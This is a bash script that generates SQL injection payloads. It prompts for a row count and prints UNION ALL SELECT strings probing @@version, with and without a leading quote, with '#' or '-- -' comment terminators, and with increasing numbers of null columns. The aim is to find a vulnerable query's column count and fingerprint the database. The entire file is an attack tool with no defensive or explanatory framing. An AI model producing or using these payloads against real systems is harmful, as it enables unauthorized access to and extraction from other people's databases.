#!/bin/bash

read -p "Enter the rows number " number

echo "-500 union all select @@version "
echo "-500 union all select @@version # "
echo "-500 union all select @@version -- - "
echo "-500 union all select 1 "
echo "-500 union all select 1 # "
echo "-500 union all select 1 -- - "


echo "-500' union all select @@version "
echo "-500' union all select @@version # "
echo "-500' union all select @@version -- - "
echo "-500' union all select 1 "
echo "-500' union all select 1 # "
echo "-500' union all select 1 -- - "

for i in `seq 1 $number`
do 
	str1=""
	str2=""
	for j in `seq 1 $i`
	do
		str1=$str1"null, "
		echo "-500 union all select $str1 @@version "
		echo "-500 union all select $str1 @@version # "
		echo "-500 union all select $str1 @@version -- - "

		echo "-500' union all select $str1 @@version "
		echo "-500' union all select $str1 @@version # "
		echo "-500' union all select $str1 @@version -- - "

		str2="$str2, null"
		echo "-500 union all select @@version $str2 "
		echo "-500 union all select @@version $str2 # "
		echo "-500 union all select @@version $str2 -- - "

		echo "-500' union all select @@version $str2 "
		echo "-500' union all select @@version $str2 # "
		echo "-500' union all select @@version $str2 -- - "
		
	done	

done
